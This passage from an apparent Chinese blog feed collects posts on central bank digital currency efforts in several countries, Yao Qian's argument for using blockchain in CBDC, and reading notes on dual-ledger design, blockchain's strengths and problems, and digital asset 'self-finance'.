<h3 id="加拿大"><a href="#加拿大" class="headerlink" title="加拿大"></a>加拿大</h3><p>加拿大央行与瑞典央行已进入CBDC的试验测试阶段：2016年加拿大银行和新加坡金融管理局分别启动了Jasper和Ubin项目，探索分布式账户技术（DLT）在银行间大额支付系统的应用。双方都采用了R3联盟的DLT技术，开发了国内银行间支付结算的批发型数字货币原型系统，并经过几个阶段的后续试验验证，但仅限于在国内尝试。2019年加拿大银行和新加坡金管局合作开发Jasper-Ubin项目，在没有中介代理的环境下，实现了跨境、跨币种和跨平台支付中应用CBDC的试验成功。可以说在批发型CBDC应用于银行间大额支付结算和跨境支付方面，加拿大央行已经进入了概念验证试验的阶段，走在国际前列。</p>
<h3 id="瑞典"><a href="#瑞典" class="headerlink" title="瑞典"></a>瑞典</h3><p>瑞典央行的情况与加拿大不同，其无现金化趋势和速度为全球关注。发行CBDC“电子克朗“的目的是确保国家货币发行权、维护国内支付结算体系稳定发展、让金融服务普惠社会各类群体。从2017年启动电子克朗研发计划到目前进入测试阶段。它着眼的方向是零售型CBDC。</p>
<p>英国央行与欧央行对CBDC进行了原型设计与概念验证：笔者前文《英国：发行数字货币，还是发行塑料钞，这是一个问题》对英国开展数字货币的研发有介绍。简单说，英国作为全球首个央行数字货币模型RSCoin的创始者，虽然后来没有像加拿大、瑞典那样有更实质性的动作，但研究的步子一直没有停顿。加新两国的联合项目，也有英国的参与：2018年下，英格兰银行和加拿大央行、新加坡金管局以及4家商业银行、2家第三方机构参与了Jasper项目第4阶段的研究活动，对解决跨境支付存在的挑战和摩擦，创建交易新模式提出了建议，为2019年加新两国的DLT系统对接奠定了研究基础。此外，英国央行前行长马克·卡尼提出了一个“合成霸权货币”的概念，意欲以此取代目前以美元为主导的国际货币组合。</p>
<h3 id="欧央行"><a href="#欧央行" class="headerlink" title="欧央行"></a>欧央行</h3><p>对CBDC的研发早已做了大量准备工作，拉加德就任行长以来，欧央行在CBDC方面的研发大幅度提速，最近在它主导下，十几个欧盟国家央行与埃森哲和R3联盟合作，开发设计了一种基于DLT的“欧洲链”系统，解决CBDC小额支付中隐私与反洗钱的平衡问题。并经过概念验证。</p>
<h3 id="日本"><a href="#日本" class="headerlink" title="日本"></a>日本</h3><p>日本央行与瑞士央行暂处于CBDC理论研究阶段：日本是一个现金偏好明显的国家，80%日常购物仍使用现金（《日本时报》，2019）。甚至在2019政府为抵销消费税上涨而推出的非现金支付积分奖励情况下，民调50-70岁以上的人仍有31%至 54%无意使用非现支付手段（《每日新闻》，2019）。显然缺乏开展零售型CBDC研发的动机。天秤币发行计划推出后，日本官方态度保持低调，直到12月央行行长黑田东彦还称，当前没有推出CBDC的需要。但最近，其副行长雨宫正佳（Masayoshi Amamiya）表示：“在日本，公众对CBDC的需求可能会激增，这取决于结算系统的发展情况。如果发生这种情况，我们必须做好应对的准备。”</p>
<p>去年底央行发表了一个有关CBDC法律问题的报告，对CBDC发行后给现行私法和刑法、日本银行法、数据收集法、行政法和竞争法等法律领域带来的影响进行了探讨，是目前所见CBDC研究中讨论法律问题最为全面、深入的报告，说明准备工作并没有停顿。</p>
<h3 id="瑞士"><a href="#瑞士" class="headerlink" title="瑞士"></a>瑞士</h3><p>瑞士情况和日本相似，公众有强烈的现金偏好，即使是年轻人如此。其他国家纷纷出于反洗钱和反恐融资等目的而取消大面额现钞，降低现金消费限额，而瑞士法郎仍然保留最大面额1000瑞郎，现金交易上限是10万瑞郎。对于私人加密货币的态度它也和日本一样比较友好，有众多加密货币机构在瑞士设立。央行高管曾表态数字货币还是私有化比较合适，去年底瑞士联邦委员会仍称CBDC目前不会给瑞士带来好处，相反将引发金融稳定等风险。</p>
<h3 id="美国"><a href="#美国" class="headerlink" title="美国"></a>美国</h3><blockquote>
<p><a href="https://www.digitaldollarproject.org/"><em>DIGITAL DOLLARS: ELECTRONIC CASH VS DIGITAL CURRENCY</em></a><br><em>New technological capabilities have created a dynamic, via tokenization, that allows for a digital version of central bank currency, without sacrificing stability, security or privacy.  This is about more than a federal government payments infrastructure.</em></p>
<p><em>In addition to coins and paper money, a dollar-based Central Bank Digital Currency (CBDC) could operate as a third form of money backed by the full faith and credit of the United States of America, but brings it into the truly portable digital world, opening up new possible use cases and applications.</em></p>
<p><em>Considering the importance of the U.S. dollar to the global economy, our work on a U.S. dollar-based CBDC via the Digital Dollar Project is a logical and important step as we drive towards a digital transformation of the global financial system.</em> </p>
<p><em>The Digital Dollar Project will be driven by an open, innovative, collaborative mindset, which will explore the full range of possibilities on how to best bring this to fruition</em></p>
</blockquote>
<p><a href="https://www.digitaldollarproject.org/">数字美元：电子现金与数字货币</a><br>新的技术通过Token化创建了一种动态的功能，该功能允许在不牺牲稳定性，安全性或私密性的情况下使用数字版本的中央银行货币。这远远超出了美国联邦政府的支付基础设施。</p>
<p>除硬币和纸币外，以美元为基础的中央银行数字货币（CBDC）可以作为第三种形式的货币，以美利坚合众国的充分信仰和信誉为后盾，但将其带入真正的便携式数字世界，打开新的可能的用例和应用程序。</p>
<p>考虑到美元对全球经济的重要性，在我们朝着全球金融体系的数字化转型迈进的过程中，我们通过“数字美元项目”在以美元为基础的CBDC方面的工作是合乎逻辑且重要的一步。</p>
<p>数字美元项目将以开放，创新，协作的心态驱动，它将探索各种方式来最大程度地实现这一目标。</p>
<p><img src="/2020/05/30/%E6%95%B0%E5%AD%97%E8%B4%A7%E5%B8%81%E5%85%A5%E9%97%A8/5.png"></p>
<p>和中国CBDC的设计几乎完全一致。本白皮书内容中并未提及”blockchain”。白皮书作者为Digital Dollar Project办公室与埃森哲</p>
<p><img src="/2020/05/30/%E6%95%B0%E5%AD%97%E8%B4%A7%E5%B8%81%E5%85%A5%E9%97%A8/6.png"></p>
<h3 id="中国"><a href="#中国" class="headerlink" title="中国"></a>中国</h3><p><img src="/2020/05/30/%E6%95%B0%E5%AD%97%E8%B4%A7%E5%B8%81%E5%85%A5%E9%97%A8/1.png"></p>
<p>中国人民银行拟推出的CBDC本质上是法定货币人民币的数字化版本，由法币储备（M0）按照1比1的比例进行兑换。</p>
<p>“从央行角度来讲，无论你是区块链还是集中账户体系，是电子支付还是所谓的移动货币，你采取任何一种技术路线，央行都可以适应。当然，你的技术路线要符合我们的门槛，比如因为是针对零售，至少要满足高并发需求，至少达到30万笔/秒。” 穆长春在会议上说到。</p>
<p>易纲在新闻发布会上表示，人民银行把数字货币和电子支付工具结合起来，将推出一揽子计划，目标是替代一部分现金。</p>
<p>作为理论上无成本的交换媒介，CBDC将能够提高支付系统的效率。 同时，在跨境金融交易的情况下，CBDC可以促成更快，更安全的结算，并允许数字金融服务领域进行更多的创新。此外，CBDC的推出还有助于打击假币，因为每个令牌和交易都需要由集中式系统进行实时的密码验证。</p>
<p>农业银行的PoC如下：</p>
<p><img src="/2020/05/30/%E6%95%B0%E5%AD%97%E8%B4%A7%E5%B8%81%E5%85%A5%E9%97%A8/2.jpg"></p>
<p><img src="/2020/05/30/%E6%95%B0%E5%AD%97%E8%B4%A7%E5%B8%81%E5%85%A5%E9%97%A8/3.png"></p>
<p><img src="/2020/05/30/%E6%95%B0%E5%AD%97%E8%B4%A7%E5%B8%81%E5%85%A5%E9%97%A8/4.jpg"></p>
<h3 id="姚前"><a href="#姚前" class="headerlink" title="姚前"></a>姚前</h3><p>2020-04刊文</p>
<p>目前大多数国家的央行数字货币（Central Bank Digital Currency，CBDC）实验都是基于区块链技术展开的。但时至今日，CBDC是否采用区块链技术依然存有争议，一种典型的观点是区块链的去中心化与中央银行的集中管理存在冲突，因此不建议CBDC采用该技术。笔者认为，区块链技术正以前所未有的速度在发展，并与各项主流技术在深度融合，因此无论从技术角度还是业务角度，现实应用中的区块链都与“原教旨主义”的理解有所不同。如何运用区块链技术来更好的服务于中心化管理下的分布式运营，可能是CBDC当前需要重点探索的方向。本文以三个典型场景为例，讨论了区块链在CBDC中的可能应用和解决方案，指出虽然区块链的技术特点是不依赖中心机构，但不代表其不能纳入到现有中心机构的体系内，只要通过合理的设计，中央银行恰恰可以利用区块链将分布式运营有效整合起来，更好地实现对CBDC的中心化管控，两者并不存在必然冲突。</p>
<p><strong>场景一：CBDC验钞</strong></p>
<p>笔者曾提出“一币、两库、三中心”的央行数字货币体系。“一币”即央行数字货币，是由央行担保并签名发行的代表具体金额的加密数字串。“两库”指数字货币发行库和数字货币商业银行库，前者是中央银行在CBDC私有云上存放CBDC发行基金的数据库，按照中央银行的现金运营管理体系进行管理，后者是商业银行存放CBDC的数据库，可以在商业银行的数据中心也可以在CBDC私有云上，遵循商业银行现金运营管理规范。“三中心”则包括认证中心、登记中心和大数据分析中心。</p>
<p>其中，登记中心记录CBDC及对应用户身份，完成权属登记，并记录流水，完成CBDC产生、流通、清点核对及消亡全过程登记。其主要功能组件分为发行登记、确权发布、确权查询网站应用、分布式账本服务几个部分。发行登记进行CBDC的发行、流通、回笼过程及权属记录；确权发布将发行登记的权属信息进行脱敏后异步发布到CBDC确权分布式账本中；确权查询网站依托分布式账本面向公众提供在线权属查询服务；分布式账本服务保证中央银行与商业银行的CBDC权属信息的一致。</p>
<p>通俗来说，可以理解为我们在登记中心利用分布式账本不可篡改、不可伪造特性，构建了一个“网上验钞机”，即CBDC确权账本，对外通过互联网提供查询服务。这种设计对当前分布式账本技术而言，在中央银行和商业银行既集中又分散的二元模式下，提供了一种巧妙的应用思路，一方面将核心的发行登记账本对外界进行隔离和保护，同时利用分布式账本优势，提高确权查询数据和系统的安全性和可信度；另一方面，由于分布式账本仅用于对外提供查询访问，交易处理仍由发行登记系统来完成，以细化原子交易颗粒度的方式来进行交易的分布式计算处理，这样可以通过业务设计的方式有效规避现有分布式账本在交易处理上的技术性能瓶颈。显然，这样的设计充分发挥了区块链的技术优势，保障CBDC验钞的可信，但并未影响中央银行对CBDC的全局管控。</p>
<p>尤其是，这种双账本包容性设计，既延续了传统技术的成熟稳定性，又为新的分布式账本技术留有空间，使得两种分布式技术相互兼容、并行不悖、优势互补，并在演进过程中，竞争择优。</p>
<p><strong>场景二：批发端支付结算</strong></p>
<p>目前各国正在开展的CBDC实验，主要针对批发端场景，且大多基于区块链技术。比如，加拿大的 Jasper 项目，试验基于区块链技术的大额支付系统；新加坡的Ubin项目，评估在分布式账本上以数字新元的代币形式进行支付结算的效果；欧洲央行和日本央行的Stella项目，旨在研究分布式账本技术（DLT）在金融市场基础设施中的应用，评估现有支付体系的特定功能是否能够在DLT环境下安全高效地运转。还有中国香港的LionRock项目、泰国的Inthanon项目等均是试验基于区块链技术的CBDC。这些区块链技术的应用都在中央银行的集中管理和严格控制下展开。</p>
<p>以新加坡的Ubin项目为例，其采用了与加拿大Jasper项目一样的数字存托凭证（Digital Deposit Receipt，DDR）模式。为了支持分布式账本中DDR的发行，现有新加坡电子支付系统（MEPS +），也就是新加坡的RTGS系统，专门建立一个DDR资金抵押账户，每日开始时，参与银行请求中央银行将其RTGS账户中的资金转移到DDR资金抵押账户，以此作为抵押，分布式账本创建相应等值的DDR，发送到各银行的DDR钱包，由此参与银行之间可开展基于分布式账本的转账和支付。日终，分布式账本系统将向MEPS+发送一个网络结算文件，MEPS+依此调整DDR资金抵押账户余额，匹配参与者在DLT网络中的DDR余额。</p>
<p>可见，去中心化的分布式账本与现有成熟的中央主导的金融基础设施并不排斥，完全可以相互融合，相互补充。一方面，基于区块链的DDR支付系统为现有RTGS系统提供了一种不依赖传统账户的新型支付方式，有效补充了现有支付清算体系。另一方面，DDR作为RTGS中电子化法定货币的数字化形态延伸，其最终可以转换回RTGS账户价值，并通过RTGS系统对外结算，也就是说，RTGS系统解决了区块链DDR到传统账户资金的结算最终性问题，这侧面也说明了区块链的结算最终性可以有机融合到现有清结算体系中。此外，由于DDR 是通过100%资金抵押生成，不影响货币供应量，因此分布式账本也不会影响到中央银行对货币的总量管控。</p>
<p>显然，在技术逻辑上，中央银行主导的基于区块链的新型支付系统是完全可行的。某种意义上，参照Ubin项目的数字存托凭证模式，可以无需借助类似网联支付平台这样的中间渠道，各家支付机构和商业银行可以通过在金融专网中构建对等网络的方式，以统一的区块链网络连接起来，开展支付清算。考虑到目前区块链技术的交易性能还在演进的过程中，上述清算业务宜在批发层面展开。</p>
<p>应该说，区块链的去中心化是指去中介，但不去监管。在联盟链的环境下，中央银行等监管部门不但可以对区块链所承载的业务及其风险进行中心化管控，而且还可以实现穿透式非现场监管。</p>
<p><strong>场景三：现金数字化</strong></p>
<p>似乎现金的数字化与准备金的数字化（即前述的数字存托凭证）没有本质上的差别，只是前者面向社会公众，而后者仅局限于银行间流通，但面向社会公众就引发了一个难题，倘若允许公众在中央银行开户，中央银行将面临着极大的服务压力，并可能引发存款搬家，导致狭义银行。</p>
<p>一种解决思路是100%备付准备金模式。代理运营机构向中央银行存缴100%备付准备金，随后在其账本上发行相应数额的数字货币可视为央行数字货币。IMF经济学家把它称为合成央行数字货币（sCBDC）。据此，我国第三方支付机构100%备付准备金存缴中央银行之后，它们虚拟账户中的资金就是央行数字货币了。若此，则中国早就是全球首个实现法币数字化的泱泱大国。</p>
<p>但仔细琢磨，这一思路存在着缺陷：一是技术上，100%准备金存缴意味着数字货币的发行、流通、回笼等全生命周期均要依附于传统账户体系，尤其是跨机构CBDC的流通，除了CBDC账本更新外，还要处理相应准备金账户间的清结算，只能牺牲系统灵活性，加以额度管控的方式去应对，而且还需要成立专门的清算机构提供互联互通服务。这不仅增大中央银行中心系统的压力和复杂性，也就是说，还是没有解决央行的服务压力，而且难以实现“账户松耦合”的要求；二是管理上，这种方式央行和运营机构在发行流通过程中是紧绑定的，央行依然承担中心化压力。如何保证代理运营机构100%备付准备金后没有超发货币，尤其是当代理运营机构运营的支付网络不受中心化管控时，中央银行更难以掌控运营代理层的货币发行量，这在一定程度上也构成了某些反对区块链技术应用于CBDC的理由。</p>
<p>视角决定思路，如果换一个角度看，会得到另一种完全不同的更优的解决方案。现在提到CBDC，许多人是自顶向下，从中央银行发行到商业银行，再从商业银行发行到个人的视角来理解CBDC的技术逻辑，所以总有一个乱发票子的担忧。实物货币受制于印钞造币环节，非如此不可，但数字货币的“印钞造币”可以瞬间完成，无需这种制约，而这才是其优势所在。如果以自底向上的视角看，可以惊讶地发现，数字货币最终用户并没有“发行”的概念，而是“兑换”的理念，是手里有多少现金，有多少存款，去兑换CBDC。所以从这角度看，乱发票子的问题并没有那么突出，代理运营机构兑换出的CBDC，不是中央银行给与的货币发行额度，而是用户用实实在在的真金白银等额兑换的结果，中央银行只是站在全局的角度统计相关信息并予以监管。实际上，目前无论是私人的稳定代币，还是各国研发的CBDC，都是按需兑换的思路，而不是扩表发行，这是一个非常关键的点。这一点对货币政策而言，意义重大，表明其没有根本性的变化；对于技术路线而言，意味着可以不拘泥于实物货币的发行流程，系统的设计可以更为简洁，局面因此大为改观。</p>
<p>基于自底向上的兑换视角，可以提出一个CBDC简化版实现方案。具体思路是：业务由底层客户发起，客户申请兑换CBDC并将其托管至代理运营机构。代理运营机构记录客户托管CBDC的明细账本，为每个托管客户单独建立明细账。代理运营机构收到客户兑换并托管CBDC请求后，在收取现金或扣减客户存款的同时，将等额CBDC记录在该客户明细账下，然后向中央银行缴回现金或扣减存款准备金，并以批量方式混同托管至中央银行。中央银行记录代理运营机构的总账本，是一个总量的概念，与代理运营机构的明细账本构成上下两级双账本结构。当同一家代理运营机构的客户之间发生CBDC支付时，只需在该机构的明细账本上变更权属，无需变更中央银行总账本。当发生跨代理运营机构的CBDC支付时，首先由相关的代理运营机构交互处理，在各自明细账本上完成CBDC的权属变更，然后由中央银行在总账本上定期批量变更各机构总账。为提高效率，减少风险，可考虑引入持续净额头寸调整、流动性节约（LSM）等机制。</p>
<p>这一方案有以下优点：一是明确了持有者对CBDC具有完全掌控权。未经持有者的签名或同意，其他任何主体均不能动用CBDC。这就使CBDC真正具备现金属性，与存款类货币本质不同。二是央行不对底层客户单独建档，也就是说，普通公众不在中央银行“开户”，降低了中央银行的服务压力，同时真正实现了“账户松耦合”的要求，因准备金账户批量调整，CBDC系统相对独立于RTGS系统。三是各家代理运营机构可以根据自己的理解，在满足统一标准的基础上，发挥各自特长构建自身的数字货币代理运营系统，有助于竞争，便于客户选择。由于是按需兑换，而不是扩表发行，因此就没有了运营代理层超发货币的担忧。另外，虽然底层客户交易信息只存储在中间层，不存储在中央银行账本上，出于政策需要或监管需要，中央银行有权向下一层的代理运营机构提取信息明细，从而在分布式运营条件下实现了中心化管控。</p>
<p><strong>结语</strong></p>
<p>区块链作为一种可能成为未来金融基础设施的新兴技术，对于中央银行和商业银行二元模式而言，有助于实现分布式运营，同时并不会影响集中管理。本文通过三个典型场景进一步论证了区块链技术的去中心化特点可以纳入到CBDC的分布式运营与央行的集中管理体系中。可将区块链技术应用于CBDC的登记账本，对CBDC验钞，保障可信。在批发端场景，各国开展的实验也表明，基于区块链技术的CBDC和支付系统具有可行性。而在现金数字化的零售场景，本文认为之所以目前CBDC研发方案一直无法发挥出央行中心管控下的分布式运营应有的优势，问题在于自顶向下的“发行”视角，对此，本文基于自底向上的“兑换”视角，提出了全新的CBDC实现方案，这一方案同时实现了“管控中心化，运营分布式”的目标。</p>
<p>“物物而不物于物”，“形而上者之为道，形而下者之为器，以道御器”，这是我国古代哲人的思想。集中管理与分布处理历来需要辩证统一地看待，不宜“先入为主”地将制度层面的中心化管控与技术层面的分布式处理简单对立起来。当前，各国基于区块链技术的央行数字货币实验进展迅速，内容已涉及隐私保护、数据安全、交易性能、身份认证、券款对付、款款对付等广泛议题。作为一项崭新的技术，区块链当然还有这样那样的缺点与不足，但这不是我们轻言放弃的理由。Facebook的Libra项目已在研发基于安全、可扩展和可靠区块链的新一代金融基础设施，这是一个全新的赛道，机遇与挑战并存，“逆水行舟，不进则退”。</p>
]]></content>
      <tags>
        <tag>Token</tag>
      </tags>
  </entry>
  <entry>
    <title>数字资产与数字金融-双账本架构</title>
    <url>/2020/07/31/%E6%95%B0%E5%AD%97%E8%B5%84%E4%BA%A7%E4%B8%8E%E6%95%B0%E5%AD%97%E9%87%91%E8%9E%8D-%E5%8F%8C%E8%B4%A6%E6%9C%AC%E6%9E%B6%E6%9E%84/</url>
    <content><![CDATA[<p>《数字货币与数字金融》读书心得II。</p>
<h3 id="我国法定数字货币展望"><a href="#我国法定数字货币展望" class="headerlink" title="我国法定数字货币展望"></a>我国法定数字货币展望</h3><p>在传统分布式数据库技术基础上，引入最新的分布式账本技术，形成央行数字货币的“双账本”功能结构：</p>
<p>一是交易账本：采用传统的（分布式）数据库技术，利用现有金融核心系统成熟经验，满足当前交易性能要求。</p>
<p>二是结果账本：用于记录最终交易结果，可采用最新的分布式账本技术，中央银行和各运营机构共同参与，各节点维护相同的账本数据，通过共识机制，保证各节点账本数据的全局一致性，并且难以篡改。通过异步方式提交结果账本，从而不影响交易账本的处理时效。结果账本数据一经写入，便具有高可靠、高安全、高可信等特点，并可为社会提供基于可信数据的确权服务，从而充分发挥分布式账本技术的优势。</p>
<p>2016年，中国央行的数字货币原型系统就采用了“双账本”技术路线，随着分布式账本技术的不断优化，性能不断提升，交易账本向结果账本异步写入交易结果，其延时会逐渐缩短。有理由相信：同步写入之日，就是分布式账本取代传统分布式数据库之时。</p>
]]></content>
      <tags>
        <tag>数字资产</tag>
      </tags>
  </entry>
  <entry>
    <title>数字资产与数字金融-理解区块链</title>
    <url>/2020/07/31/%E6%95%B0%E5%AD%97%E8%B5%84%E4%BA%A7%E4%B8%8E%E6%95%B0%E5%AD%97%E9%87%91%E8%9E%8D-%E7%90%86%E8%A7%A3%E5%8C%BA%E5%9D%97%E9%93%BE/</url>
    <content><![CDATA[<p>《数字货币与数字金融》读书心得III。</p>
<h3 id="区块链的优势"><a href="#区块链的优势" class="headerlink" title="区块链的优势"></a>区块链的优势</h3><p>一是不可篡改，更加安全。传统技术通过宣布财产所有权，并以法律做背书，比如房产。区块链技术通过分享记录交易的数据库，辅以密码学和共识算法，实现了数据库历史记录的不可篡改。实践证明，这样一个数据库可以确保市值达到百亿美元的比特币在全球黑客的攻击下，运转稳定。</p>
<p>二是异构多活，可用性强。从区块链的系统机构看，每个系统参与方都是一个异地多活节点，远远超过两地三中心这样的冗余度，是天生的多活系统。如果某个节点遇到网络问题、硬件故障、软件错误或者黑客控制，均不会影响系统以及其他参与节点。问题节点在排除故障后并完成数据同步后，便可以随时再加入到系统中继续工作。此外区块链中的节点通过点对点的通信协议进行交互，在保证通信协议一致的情况下不同节点可由不同开发语言、基于不同的架构、实现不同版本的全节点来处理交易。由此构成的软件异构环境确保了即便某个版本的软件出现问题，区块链的整体网络不会受到影响，这也是其高可用的基石所在。</p>
<p>三是新型协作机制，效率更高。对于公司之间的大规模多变协作，在区块链应用之前，通常只有两种解决方法。其一，在多个主题之间向上寻找共同的“上级”机构，实现对整个组织进行协调。它局限于某些场景很难找到一个所有市场参与方共同认可的信任中心，并且对于中心而言，由于优先级的存在，不一定能够及时、有效地满足所有协作需求。其二，参与方让渡部分权利，共同组建第三方机构完成协作。它局限于若制度不能满足第三方机构的盈利和管理需要，其往往能够成为各参与方的实际权利中心。区块链提供了另一种方法：以对等的方式把参与方连接起来，实现更有弹性的协作方式。因为参与方职责明确，不用向第三方机构让渡权力，无须维护第三方信任机构的成本，有利于各方更好地开展协作。作为信任机器，区块链有望成为低成本、高效率的一种全新的协作模式，形成更大范围、更低成本的新协同机制。</p>
<p>四是智能合约更加先进。智能合约具有透明可信、自动执行、强制履约的优点。首先，对于用户来讲，只要能够接入到区块链中，用户就可以看到编译后的智能合约，可以对代码进行检查和审计。其次，可信还来源于智能合约的运行环境，一个程序的运行结果除了与程序代码有关，还和技工给程序处理的数据有关。因此，智能合约一旦被部署到区块链上，程序的代码和数据就是公开透明的，无法被篡改，并且一定会按照预先定义的逻辑去执行，产生预期中的结果。如果基于代码的智能合约能够被法律体系所认可，那么依托程序的自动化优势，通过组合串联不同的智能合约，达到不同的目的，能够是我们加速走向更为高效的商业社会。</p>
<h3 id="区块链的问题"><a href="#区块链的问题" class="headerlink" title="区块链的问题"></a>区块链的问题</h3><p>一是性能问题有待突破。区块链的性能问题主要体现为吞吐量和存储带宽的矛盾。</p>
<p>二是隐私保护有待加强。身份隐私与交易信息隐私。</p>
<p>三是区块链升级修复机制有待探索。在具体实践中，公有链社区摸索出“硬分叉”与“软分叉”等升级机制，但遗留问题还有待观察。对于常规代码升级，通过分离代码与数据，结合多层智能合约结构，实现可控的智能合约更替。</p>
<p>四是跨链技术成为难题。目前三种跨链技术：公证人机制、中继链、哈希锁定技术。</p>
<h3 id="理解区块链"><a href="#理解区块链" class="headerlink" title="理解区块链"></a>理解区块链</h3><p>1.从系统架构看，与目前的互联网相比较，区块链使得C端客户的自主掌控能力及其在系统中的话语权得到极大的增强，信息网络由中心化架构进入以C端为主的平权时代。</p>
<p>2.从会计学角度看，区块链是一种全新的分布式账本技术，采用了全新的记账方法：每个人都可以参加，只要按照要求，达到选举规则的设定目标，就可以获得记账权，成为新区块的记账人，所有参与者共有、共享账本信息，都能检测、验证账本信息。与传统账本技术相比较，DLT账本技术的优势在于：不易伪造，难以篡改，效率高，且可追溯，容易审计；通过交易签名、共识算法和跨链技术保障分布式账本的一致性，自动实时完成账证相符、账账相符、账实相符；从技术可行性看，瞬时的资产负债表编制或将成为可能。</p>
<p>3.从账户角度看，区块链私钥本地生成，非常隐秘，从中导出公钥，再变换出钱包地址，自己给自己开户，不需要中介，这在金融史上市一个非常重大的变化：一是用户可通过数字身份运用安全技术对金融资产进行自主控制；二是用户之间点对点进行金融资产交易，可以独立于任何第三方服务机构；三是用户对数字身份的保管，直接承担交易责任，自金融模式由此应运而生。</p>
<p>4.从资产交易角度看，它是一种全新的价值交换技术，既可采用UTXO模式，完成“为花费交易输出”的转移，也可以采用传统的Account模式。UTXO模式和Account模式可相互转化，通过聚合归纳(Reduce)，UTXO可转化为账户余额，而对账户余额进行拆分则可得到UTXO的结果。基于这一价值交换技术，我们可以创造一种全新的金融市场模式：去中心化资产交易。</p>
<p>5.从组织行为学角度看，区块链是一种新型的去组织化的分布式协同生产活动，它通过激励相容的算法规则和契约安排，明确了各方的经济利益，充分调动了各方的积极性，使有效的分布式协同生产成为可能，出现了新型的组织形态—自治去中心化组织（DAO）：没有董事会，没有公司章程，没有森严的上下级制度，没有中心化的管理者……去中心化、去权威、点对点平权等，完全颠覆了人们通常脑海里的企业形象。这是经济活动组织形式的变革。</p>
<p>6.从经济学角度看，它开创了一种新型的算法经济模式。以去中心化、开放为特征，强调和尊重市场交易的自愿原则，发挥市场价格的统筹协调机制，在经济自由度上，兼具计划和市场两种机制的优点，是一种更加接近自由市场的经济模型。</p>
]]></content>
      <tags>
        <tag>数字资产</tag>
      </tags>
  </entry>
  <entry>
    <title>数字资产与数字金融-自金融</title>
    <url>/2020/07/30/%E6%95%B0%E5%AD%97%E8%B5%84%E4%BA%A7%E4%B8%8E%E6%95%B0%E5%AD%97%E9%87%91%E8%9E%8D-%E8%87%AA%E9%87%91%E8%9E%8D/</url>
    <content><![CDATA[<h3 id="数字资产各种属性深度融合，益于创新"><a href="#数字资产各种属性深度融合，益于创新" class="headerlink" title="数字资产各种属性深度融合，益于创新"></a>数字资产各种属性深度融合，益于创新</h3><p>数字资产：股票是股东权益的证券化，债券是债券的证券化，电子黄金是黄金的证券化，抵押贷款证券（MBS）是银行信贷的证券化，证券的意义在于为资产创造了流动性，但有了资产数字化，传统证券的含义可能就会有新的变化。</p>
<p>真正意义的数字资产应该是原生的、包含全信息的、以数字形式展现和流转的资产。数字化后的订货合同、物流单据、发票、保理合同等资产，才是真正的数字资产。数字资产模糊了证券属性。</p>
<h3 id="资产数字化的关键是如何为实体经济赋能"><a href="#资产数字化的关键是如何为实体经济赋能" class="headerlink" title="资产数字化的关键是如何为实体经济赋能"></a>资产数字化的关键是如何为实体经济赋能</h3><blockquote>
<p>程序 = 算法 + 结构，获得图灵奖的Pascal之父——Nicklaus Wirth提出的著名公式</p>
</blockquote>
<p>金融科技 = 算法 + 数据。</p>
<p>数字资产产生、流通、确权都依靠全新的价值交换技术，可采用基于真随机数的加密技术，也可以采用基于区块链技术、DAG技术或者公证人机制的分布式账本技术，在未来甚至可采用量子叠加态和量子计算实现的量子技术。</p>
<p>可以说区块链承载了太多的理想，获得了资本和产业的热捧。溢美之词，掩盖了该技术在比特币、以太坊之外少有重大应用的尴尬。技术人员应该沉静下来，认真分析并探索改进区块链系统交互，如何解决区块链上的数据隐私问题，如何将智能合约与现行法规相结合，如何设计适合区块链的治理机制和标准，等等。</p>
<p>我国是互联网大国，也是数据大国。但是就数据质量来说，却不是这样。怎样在数量优势上提升质量，把数据资源转化为价值资产，从而产生信用并为实体经济服务，最终促进社会经济发展，无疑是我国金融科技领域的难题和挑战。而这恰恰是资产数字化的关键所在。</p>
<p>区块链作为一项可信技术，由多方认可，多方背书，是新一代金融基础设施的技术雏形，可以为现有金融机构未能触及的底层实体“加持”信用，增进相互协作，降低交易成本，有可能创造一个全新局面。</p>
<h3 id="资产自金融，普惠共享"><a href="#资产自金融，普惠共享" class="headerlink" title="资产自金融，普惠共享"></a>资产自金融，普惠共享</h3><p>自金融的典型特征：1）用户自主掌控数字身份；2）用户自主掌控数字资产；3）用户之间点对点交易，可以独立于第三方中介机构。</p>
<p>如何才能让中小企业获得平等的信息话语权和自主融资的能力？一个行之有效的解决方案是利用DLT与分布式文件系统技术，将底层资产的全量原生信息同步上链，利用公私钥技术实现权利人持有并转移资产，通过核心企业的信息服务商接入，持续有效地披露底层真实贸易背景，从而形成数字资产。数字资产赋予传统资产高度自主流动性，极大地提高了供应链金融业务的效率和真实性，为投资人建立了一个动态、完整、真实、可信的信息披露机制，从根本上解决了中小企业底层资产多层级流转的信息穿透问题，荣中小企业获得对等话语权，无须用以来核心企业信用，独立开展融资活动，同时金融机构可以不依赖核心企业，直接通过可信的DLT账本，获取融资所需的中小企业底层资产信息。让传统金融中的弱势群体不再弱势，不再融资难、融资贵，金融将变得更加贴近实体，更加普惠共享，同时在现代科技的支持下，其安全性与监管的便利性，同传统金融资产相比，已不可同日而已，可以灵活地补充现有金融服务的空白地带。</p>
<h3 id="资产数字化将催生金融的零售革命"><a href="#资产数字化将催生金融的零售革命" class="headerlink" title="资产数字化将催生金融的零售革命"></a>资产数字化将催生金融的零售革命</h3><p>数字金融的发展将模糊场内与场外之间的边界。某种意义上，目前导致市场出现场内、场外分层的主因之一，是（技术）可信程度不到位。传统技术无法很好解决金融交易的信任问题，因此许多交易需要在有组织的场内市场开展（当然也有规模经济的因素），国家认可的法理保障解决了可信问题。随着区块链、物联网等现代数字金融科技的发展，技术可信成为法律增信的补充手段。通过可信技术的赋能，原来分处“两张皮”的数据与价值，真正聚合成为物理与逻辑一体的数字资产。数字是价值，价值是数字，数字的流转就是价值的流转。任何资产均可利用可信技术开展数字化，流转盘活起来，而不完全依赖法律增信，此时，什么是场内，什么是场外，也就不再泾渭分明。</p>
<p>数字金融或将重构金融运行方式、服务模式乃至整个生态体系。在科技驱动下，它不用依赖传统的金融中介作用，即可让资产在保留原生全量信息的条件下流通起来。原先在场外大规模“沉寂”的非标准化资产，如仓单、知识产权、合同等各类资产，将焕发全新的金融“生命力”，低成本、高效率流转起来，经济前景和意义不可估量。</p>
<p>再做一步思考，数字资产化将催生金融的零售革命，就像互联网的出现催生了阿里巴巴等零售巨头一样，零售金融市场的觉醒将会带来更具深远影响的金融变革。</p>
<h3 id="数字货币将超越美元，升级换代"><a href="#数字货币将超越美元，升级换代" class="headerlink" title="数字货币将超越美元，升级换代"></a>数字货币将超越美元，升级换代</h3><p>数字资产互换数字货币！在数字资产的世界里，数字法币的缺失是问题的根本。对此，私人部门和公共部门均在发力。</p>
